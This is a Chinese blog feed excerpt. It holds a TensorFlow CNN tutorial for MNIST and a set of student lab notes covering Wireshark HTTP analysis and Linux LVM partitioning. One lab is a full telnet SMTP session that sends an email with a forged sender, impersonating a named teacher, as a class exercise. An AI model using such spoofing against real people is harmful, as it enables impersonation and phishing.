                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/dachuang/juanji.png" alt title class>
                <p></p>
            </figure>

<h2 id="池化"><a href="#池化" class="headerlink" title="池化"></a>池化</h2><p><a href="https://zhuanlan.zhihu.com/p/35769417" target="_blank" rel="noopener">如何理解CNN中的池化？</a>.<br>我的通俗的理解: 池化用来提取一个张量中的最具有特征的值, 可能是最大值, 也可能是最小值或者平均值. 池化的意义在于可以在保持数据较少损失的同时减少数据规模, 降低运算成本.</p>
<h2 id="卷积神经网络"><a href="#卷积神经网络" class="headerlink" title="卷积神经网络"></a>卷积神经网络</h2><p>下面要构建整个项目的网络结构. 总的来说分为 5 层, 分别是 第一层卷积运算, 第二层卷积运算, 第三层为全连接层, 第四层为 Dropout 层,最后一层为 softmax 输出层. 因为包含了卷积运算, 所以这个神经网络也是卷积神经网络. 这四层网络都有各自的作用.</p>
<h3 id="第一层卷积层"><a href="#第一层卷积层" class="headerlink" title="第一层卷积层."></a>第一层卷积层.</h3><p>第一层卷积=层直接对图片的原始数据进行处理, 作用是要对图片特征进行初步的提取. 在这层卷积中, 设定 filter(核) 的大小为 $5\times5$, 并每次提取出一个长度为 32 的向量.</p>
<p>为了符合tensorflow中卷积运算函数的格式要求, 将图片的张量形状设定为$x = [-1,28,28,1]$, 这里的 -1 代表未设定(因为图片数量不固定), 第二三个维度代表图片的长和宽, 第四个维度代表了颜色通道数, 因为数据集是灰度图, 所以只有一个维度, 如果是rgb图像那么就有三个维度. 可以把这个输入的 x 张量想象为 一摞叠起来的照片(具有厚度). 同时将 filter1 的张量形状设定为$[5,5,1,32]$, 这里第三个维度的 1 与图书数据的通道数对应. 我将其理解为长度为 1 的输入向量, 计算结果为长度为 32 的输出向量. 那么偏置量显然也要设定为长度为 32 的向量.</p>
<p>根据卷积运算的定义, 可以确定这里的 $result_1 = (x*filter1) + b$ 的结果是个形状为 $[28,28,32]$ 的张量.</p>
<p>但是这层卷积中还包括了池化. 这个项目中使用的是 <code>max_pool</code>, 直观的理解应该就是提取最明显的特征作为下一层的输入数据. 这里定义池化的模板大小为$2\times2$, 步长为 1, 边距为 0, 并且下面几层的池化均为这个设定. 这样每次池化会将相邻且不重叠的 $2\times2$ 个元素作为一个 padding, 提取出其中最”大”的数据保留, 其余数据删掉. 这里何为最大我不清楚, 有可能是向量的模长, 也可能是别的, 但是一定是最能反映图像特征的. 总之经过这样一层处理, 我们的数据先是被”挖掘”出更多的特征(卷积后的结果让数据长度由1变为32), 然后又经过”提炼”让数据量大幅变小(池化让图片每4个像素缩为一个, 最后成了$14\times14$的大小.)</p>
<p>$$[28,28,1] \underrightarrow{ 第一层卷积层 }[14,14,32]$$</p>
<p>没有图不好理解, 有空在网上找几个图补上.</p>
<h3 id="第二层卷积层"><a href="#第二层卷积层" class="headerlink" title="第二层卷积层"></a>第二层卷积层</h3><p>为了构建一个更深的网络, 将图片中的数据进一步提炼, 舍掉无用的数据, 这里再加入一层卷积层. 这一次要将32位的向量扩充到64位, 也就是计算出64个特征.</p>
<p>同样还是先卷积运算, 定义 filter2 的张量形式为 $[5,5,32,64]$, 显然偏置量就为一个64位的向量. </p>
<p>$result_2 = (result_1*filter2)$. </p>
<p>类似第一层, 还要在加上池化. 模板大小也为$2\times2$, 这样输出的图片就是$7\times7$了.</p>
<p>$$[14,14,32] \underrightarrow{ 第一层卷积层 }[7,7,64]$$</p>
<h3 id="第三层全连接层-密集连接层"><a href="#第三层全连接层-密集连接层" class="headerlink" title="第三层全连接层(密集连接层)"></a>第三层全连接层(密集连接层)</h3><p>全连接层的优点是每个输出的神经元都会受到输入数据的作用, 可以把输入数据的所有特征进行综合, 但是明显需要计算量也很大, 需要的参数也非常多. 所以之前两层也可以看做是为这层做准备, 一是要提前提取特征, 二是减少数据规模.  </p>
<p>经过前两层的处理, 数据规模已经足够小了, 且计算出了 64 个特征值. 全连接的输出应该为一个向量. 这里设定向量的长度为 1024, 所以权重张量设定为$[7,7,64,1024]$ 也就是说需要 1024 个结点(神经元)来计算. 那么可以算出实际全连接时需要的参数有$7\times7\times64\times1024$个, 已经是个很大的数字了, 如果之前数据规模没降下来, 那数字又会大的惊人.</p>
<p>同理偏置量也是1024位的向量.</p>
<figure class="image-box">
                <img src="https://img-blog.csdn.net/20170928110946345?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTAyMTc3Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt title class>
                <p></p>
            </figure>


<p>$$result_3 = matmul(result_2, W) + b $$</p>
<p>$$[7,7,64] \underrightarrow{ 第三层全连接层 }[1024]$$</p>
<h3 id="第四层-Dropout-层"><a href="#第四层-Dropout-层" class="headerlink" title="第四层 Dropout 层"></a>第四层 Dropout 层</h3><p>这一层的目的是为了防止过拟合.</p>
<p><a href="https://zhuanlan.zhihu.com/p/38200980" target="_blank" rel="noopener">深度学习中Dropout原理解析</a></p>
<p>Dropout说的简单一点就是：我们在前向传播的时候，让某个神经元的激活值以一定的概率p停止工作，这样可以使模型泛化性更强，因为它不会太依赖某些局部的特征，如图所示。</p>
<figure class="image-box">
                <img src="https://pic2.zhimg.com/v2-5530bdc5d49f9e261975521f8afd35e9_r.jpg" alt title class>
                <p></p>
            </figure>

<p>$$[1024] \underrightarrow{ 第四层Dropout层 }[1024]$$</p>
<h3 id="第五层输出层"><a href="#第五层输出层" class="headerlink" title="第五层输出层"></a>第五层输出层</h3><p>这一层和之前的基础教程没啥区别, 主要的作用还是通过softmax使神经网络的输出规范化为有意义的概率值. 也就是限定了网络输出的值域为[0,1], 同理输出为10位的向量, 代表了这个图像被分类到十个数字的概率.<br>$$[1024] \underrightarrow{ 第五层输出层 }[10]$$</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> tensorflow.examples.tutorials.mnist.input_data <span class="keyword">as</span> input_data</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">weight_variable</span><span class="params">(shape)</span>:</span></span><br><span class="line">    initial = tf.truncated_normal(shape, stddev=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">return</span> tf.Variable(initial)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bias_variable</span><span class="params">(shape)</span>:</span></span><br><span class="line">    initial = tf.constant(<span class="number">0.1</span>, shape=shape)</span><br><span class="line">    <span class="keyword">return</span> tf.Variable(initial)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv2d</span><span class="params">(x, W)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tf.nn.conv2d(x, W, strides=[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>], padding=<span class="string">'SAME'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">max_pool_2x2</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tf.nn.max_pool(x, ksize=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>], strides=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>], padding=<span class="string">'SAME'</span>)</span><br><span class="line"> </span><br><span class="line">mnist = input_data.read_data_sets(<span class="string">"MNIST_data/"</span>, one_hot=<span class="literal">True</span>)</span><br><span class="line">sess = tf.InteractiveSession()</span><br><span class="line"></span><br><span class="line">x = tf.placeholder(<span class="string">'float'</span>, shape=[<span class="literal">None</span>, <span class="number">784</span>])</span><br><span class="line">y_hat = tf.placeholder(<span class="string">'float'</span>, shape=[<span class="literal">None</span>, <span class="number">10</span>])</span><br><span class="line">x_image = tf.reshape(x, [<span class="number">-1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>])</span><br><span class="line"><span class="comment"># 第一层卷积</span></span><br><span class="line">W_conv1 = weight_variable([<span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">32</span>])</span><br><span class="line">b_conv1 = bias_variable([<span class="number">32</span>])</span><br><span class="line">h_conv1 = tf.nn.relu(conv2d(x_image, W_conv1) + b_conv1)</span><br><span class="line">h_pool1 = max_pool_2x2(h_conv1)</span><br><span class="line"><span class="comment"># 第二层卷积</span></span><br><span class="line">W_conv2 = weight_variable([<span class="number">5</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">64</span>])</span><br><span class="line">b_conv2 = bias_variable([<span class="number">64</span>])</span><br><span class="line">h_conv2 = tf.nn.relu(conv2d(h_pool1, W_conv2) + b_conv2)</span><br><span class="line">h_pool2 = max_pool_2x2(h_conv2)</span><br><span class="line"><span class="comment"># 全连接层</span></span><br><span class="line">W_fc1 = weight_variable([<span class="number">7</span> * <span class="number">7</span> * <span class="number">64</span>, <span class="number">1024</span>])</span><br><span class="line">b_fc1 = bias_variable([<span class="number">1024</span>])</span><br><span class="line">h_pool2_flat = tf.reshape(h_pool2, [<span class="number">-1</span>, <span class="number">7</span> * <span class="number">7</span> * <span class="number">64</span>])</span><br><span class="line">h_fc1 = tf.nn.relu(tf.matmul(h_pool2_flat, W_fc1) + b_fc1)</span><br><span class="line"><span class="comment"># Dropout</span></span><br><span class="line">keep_prob = tf.placeholder(<span class="string">'float'</span>)</span><br><span class="line">h_fc1_drop = tf.nn.dropout(h_fc1, keep_prob)</span><br><span class="line"><span class="comment"># 输出层</span></span><br><span class="line">W_fc2 = weight_variable([<span class="number">1024</span>, <span class="number">10</span>])</span><br><span class="line">b_fc2 = bias_variable([<span class="number">10</span>])</span><br><span class="line"><span class="comment"># softmax</span></span><br><span class="line">y_conv = tf.nn.softmax(tf.matmul(h_fc1_drop, W_fc2) + b_fc2)</span><br><span class="line"><span class="comment"># 训练评估模型</span></span><br><span class="line">cross_entropy = -tf.reduce_sum(y_hat*tf.log(y_conv))</span><br><span class="line">train_step = tf.train.AdamOptimizer(<span class="number">1e-4</span>).minimize(cross_entropy)</span><br><span class="line">correct_prediction = tf.equal(tf.argmax(y_conv, <span class="number">1</span>), tf.argmax(y_hat, <span class="number">1</span>))</span><br><span class="line">accuracy = tf.reduce_mean(tf.cast(correct_prediction, <span class="string">'float'</span>))</span><br><span class="line">sess.run(tf.global_variables_initializer())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2000</span>):</span><br><span class="line">    batch = mnist.train.next_batch(<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        train_accuracy = accuracy.eval(feed_dict=&#123;x: batch[<span class="number">0</span>], y_hat: batch[<span class="number">1</span>], keep_prob: <span class="number">1.0</span>&#125;)</span><br><span class="line">        print(<span class="string">"step %d, training accuracy %g"</span> % (i, train_accuracy))</span><br><span class="line">    train_step.run(feed_dict=&#123;x: batch[<span class="number">0</span>], y_hat: batch[<span class="number">1</span>], keep_prob: <span class="number">0.5</span>&#125;)</span><br><span class="line"> </span><br><span class="line">print(<span class="string">"test accuracy %g"</span> % accuracy.eval(feed_dict=&#123;</span><br><span class="line">    x: mnist.test.images, y_hat: mnist.test.labels, keep_prob: <span class="number">1.0</span></span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure>

]]></content>
      
        
        <tags>
            
            <tag> tensorflow </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一些有趣的实验]]></title>
      <url>/2019/10/03/linux%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%AE%9E%E9%AA%8C/</url>
      <content type="html"><![CDATA[<p>课上老师布置的一些实验的记录.</p>
<a id="more"></a>
<h1 id="实验合集"><a href="#实验合集" class="headerlink" title="实验合集"></a>实验合集</h1><h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><h3 id="smtp-发送伪造邮件"><a href="#smtp-发送伪造邮件" class="headerlink" title="smtp 发送伪造邮件"></a>smtp 发送伪造邮件</h3><p>计网老师布置的一个小任务 : 伪装<code>ligang</code>老师给他发个邮件. </p>
<p>通过telnet与smtp服务器进行命令行交互, 手工编写邮件内容, 就可以设置虚假的发件人信息.</p>
<p>以下演示在<code>Windows10 cmd</code>中.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt; telnet</span><br><span class="line">&gt; o smtp.qq.com 587</span><br><span class="line">220 smtp.qq.com Esmtp QQ Mail Server </span><br><span class="line">&gt; helo smtp</span><br><span class="line">250 smtp.qq.com                    </span><br><span class="line">&gt; starttls  </span><br><span class="line">220 Ready to start TLS             </span><br><span class="line">&gt; auth login                       </span><br><span class="line">334 VXNlcm5hbWU6   </span><br><span class="line">&gt; MTM0ODY1MTU4MEBxcS5jb20=  <span class="comment"># qq邮箱的base64编码</span></span><br><span class="line">334 UGFzc3dvcmQ6                  </span><br><span class="line">&gt; ***************   <span class="comment"># qq邮箱授权码的base64编码              </span></span><br><span class="line">235 Authentication successful     </span><br><span class="line">&gt; mail from:&lt;1348651580@qq.com&gt;            </span><br><span class="line">250 Ok       </span><br><span class="line">&gt; rcpt to:&lt;3018******@tju.edu.cn&gt;          </span><br><span class="line">250 Ok       </span><br><span class="line">&gt; data </span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;      </span><br><span class="line">&gt; from:ligang@tju.edu.cn            </span><br><span class="line">&gt; to:&lt;3018******@tju.edu.cn&gt;</span><br><span class="line">&gt; subject:i want to play a game    </span><br><span class="line">&gt; </span><br><span class="line">&gt; we will we will rockyou.</span><br><span class="line">&gt; .</span><br><span class="line">250 Ok: queued as</span><br></pre></td></tr></table></figure>

<p>按照上面的输入成功后, 会有如下的效果.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/smtp.png" alt title class>
                <p></p>
            </figure>

<p>可以发现, 发件人成功的显示成了<code>ligang</code>.</p>
<p>不过细心的你(口区)应该已经发现了, 最后竟然显示了我真实的邮箱 ! ! !</p>
<p>要想去掉这个代发的字段也有办法, 那就是需要搭建自己的smtp服务器.( 正在尝试中 … )</p>
<p>不过这种欺骗手段似乎只要查看了邮件头就没有任何效果了, 只能拿去吓唬吓唬其它专业的同学们, 哈哈哈.</p>
<h3 id="http-下的文件下载分析"><a href="#http-下的文件下载分析" class="headerlink" title="http 下的文件下载分析"></a>http 下的文件下载分析</h3><ul>
<li>实验目的 : <ul>
<li>抓包分析 http 下载文件的细节</li>
<li>思考迅雷下载实现加速, 断点续传等功能的原理</li>
</ul>
</li>
</ul>
<h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>为了便于控制和能省流量, 我用 Apache 在本地(Windows)启动一个web服务器, 并将一个约 74MB 的文件放置于网站根目录下供我模拟下载.</p>
<p>然后使用<code>wireshark</code>捕获<code>Npcap Loopback Adapter</code>的数据包. 很快我就找到了下载文件的<code>http.GET请求包</code></p>
<p>但是当我追踪这个http流的时候, 发现竟然只有一个http数据包. </p>
<p><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/stream2.png" alt></p>
<p>于是我尝试追踪了下其他的tcp数据包, 根据数据包的目的端口号(可以根据刚才的Get请求得到)和数据包的大小(下载文件的响应包应该会较大). 最终追踪到了正确的tcp流. </p>
<p><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/stream3.png" alt></p>
<p>第一行的状态行<code>HTTP/1.1 200 OK</code>, 可以判断出数据应该也是使用http协议传输到客户端, 但是<code>wireshark</code>为啥不能追踪 http流 还不是很清楚.</p>
<p>从 <code>RESPONSE</code> 包的 <code>HEAD</code> 中, 有 <code>Content-Length: 76559956</code> 这么一项. 因为 76559956 / (1000 * 1000) = 76.5, 而我下载的文件大小是 74MB , 也就是这个参数的单位是 byte.</p>
<p>然而在</p>
<p>(未完待续)</p>
<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="linux-文件管理系统实验记录"><a href="#linux-文件管理系统实验记录" class="headerlink" title="linux 文件管理系统实验记录"></a>linux 文件管理系统实验记录</h3><ul>
<li>环境 : Ubuntu 16.04 (VMware Workstation 15 pro)</li>
<li>实验目标 : 使用命令行管理文件系统</li>
</ul>
<h4 id="分配虚拟硬盘"><a href="#分配虚拟硬盘" class="headerlink" title="分配虚拟硬盘"></a>分配虚拟硬盘</h4><p>虚拟机关闭时, 在VMware的<code>编辑虚拟机设置</code>里添加两个新的硬盘, 各10G.</p>
<p>完成后可以打开虚拟机确认:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~$ sudo fdisk -l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdb: 10 GiB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdc: 10 GiB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br></pre></td></tr></table></figure>

<h4 id="创建和扩大文件系统和相关逻辑卷管理"><a href="#创建和扩大文件系统和相关逻辑卷管理" class="headerlink" title="创建和扩大文件系统和相关逻辑卷管理"></a>创建和扩大文件系统和相关逻辑卷管理</h4><h5 id="使用fdisk将sdb分出分区"><a href="#使用fdisk将sdb分出分区" class="headerlink" title="使用fdisk将sdb分出分区"></a>使用fdisk将sdb分出分区</h5><ul>
<li>sdb1:主分区, 4G  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo fdisk /dev/sdb</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.27.1).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table.</span><br><span class="line">Created a new DOS disklabel with disk identifier 0x7ae8300a.</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">Partition <span class="built_in">type</span></span><br><span class="line">p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">e   extended (container <span class="keyword">for</span> logical partitions)</span><br><span class="line">Select (default p): p</span><br><span class="line">分区号 (1-4, default 1): </span><br><span class="line">First sector (2048-20971519, default 2048): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (2048-20971519, default 20971519): +4G</span><br><span class="line"></span><br><span class="line">Created a new partition 1 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 4 GiB.</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>sdb2: 扩展分区, 6G.  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">Partition <span class="built_in">type</span></span><br><span class="line">p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">e   extended (container <span class="keyword">for</span> logical partitions)</span><br><span class="line">Select (default p): e</span><br><span class="line">分区号 (2-4, default 2): </span><br><span class="line">First sector (8390656-20971519, default 8390656): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (8390656-20971519, default 20971519): </span><br><span class="line"></span><br><span class="line">Created a new partition 2 of <span class="built_in">type</span> <span class="string">'Extended'</span> and of size 6 GiB.</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>sdb5, sdb6逻辑分区, 各3G  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">All space <span class="keyword">for</span> primary partitions is <span class="keyword">in</span> use.</span><br><span class="line">Adding logical partition 5</span><br><span class="line">First sector (8392704-20971519, default 8392704): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (8392704-20971519, default 20971519): +3G</span><br><span class="line"></span><br><span class="line">Created a new partition 5 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 3 GiB.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">All space <span class="keyword">for</span> primary partitions is <span class="keyword">in</span> use.</span><br><span class="line">Adding logical partition 6</span><br><span class="line">First sector (14686208-20971519, default 14686208): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (14686208-20971519, default 20971519): +3G</span><br><span class="line"></span><br><span class="line">Created a new partition 6 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 3 GiB.</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： w</span><br><span class="line"></span><br><span class="line">The partition table has been altered.</span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="将sdb6-和-sdc-初始化为物理卷-PV"><a href="#将sdb6-和-sdc-初始化为物理卷-PV" class="headerlink" title="将sdb6 和 sdc 初始化为物理卷(PV)"></a>将sdb6 和 sdc 初始化为物理卷(PV)</h5><p>这里有个小插曲, 我的机器中 pvcreate 工具没有安装.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo pvcreate /dev/sdb6</span><br><span class="line">sudo: pvcreate：找不到命令</span><br><span class="line"><span class="comment"># 安装 lvm2 即可</span></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo apt-get install lvm2</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo pvcreate /dev/sdb6</span><br><span class="line">  Physical volume <span class="string">"/dev/sdb6"</span> successfully created.</span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo pvcreate /dev/sdc</span><br><span class="line">  Physical volume <span class="string">"/dev/sdc"</span> successfully createdyjn</span><br><span class="line">  </span><br><span class="line">@yjn-virtual-machine:/dev$ sudo pvs</span><br><span class="line">PV         VG Fmt  Attr PSize  PFree </span><br><span class="line">/dev/sdb6     lvm2 ---  &lt;3.00g &lt;3.00g</span><br><span class="line">/dev/sdc      lvm2 ---  10.00g 10.00g</span><br></pre></td></tr></table></figure>

<h5 id="将-sdb6-和-sdc-加入卷组-VG-vg00-中"><a href="#将-sdb6-和-sdc-加入卷组-VG-vg00-中" class="headerlink" title="将 sdb6 和 sdc 加入卷组(VG) vg00 中"></a>将 sdb6 和 sdc 加入卷组(VG) vg00 中</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgcreate vg00 /dev/sdb6</span><br><span class="line">  Volume group <span class="string">"vg00"</span> successfully created</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgex vg00 </span><br><span class="line">vgexport  vgextend  </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgextend vg00 /dev/sdc </span><br><span class="line">  Volume group <span class="string">"vg00"</span> successfully extended</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgs</span><br><span class="line">  VG   <span class="comment">#PV #LV #SN Attr   VSize  VFree </span></span><br><span class="line">  vg00   2   0   0 wz--n- 12.99g 12.99g</span><br></pre></td></tr></table></figure>

<h5 id="在vg00-中创建逻辑卷-LV-lv00-初始大小为-10G"><a href="#在vg00-中创建逻辑卷-LV-lv00-初始大小为-10G" class="headerlink" title="在vg00 中创建逻辑卷(LV)lv00, 初始大小为 10G"></a>在vg00 中创建逻辑卷(LV)lv00, 初始大小为 10G</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgs</span><br><span class="line">  VG   <span class="comment">#PV #LV #SN Attr   VSize  VFree </span></span><br><span class="line">  vg00   2   0   0 wz--n- 12.99g 12.99g</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo lvcreate -L 10G -n lv00 /dev/vg00</span><br><span class="line">  Logical volume <span class="string">"lv00"</span> created.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo lvs</span><br><span class="line">  LV   VG   Attr       LSize  Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  lv00 vg00 -wi<span class="_">-a</span>----- 10.00g</span><br></pre></td></tr></table></figure>

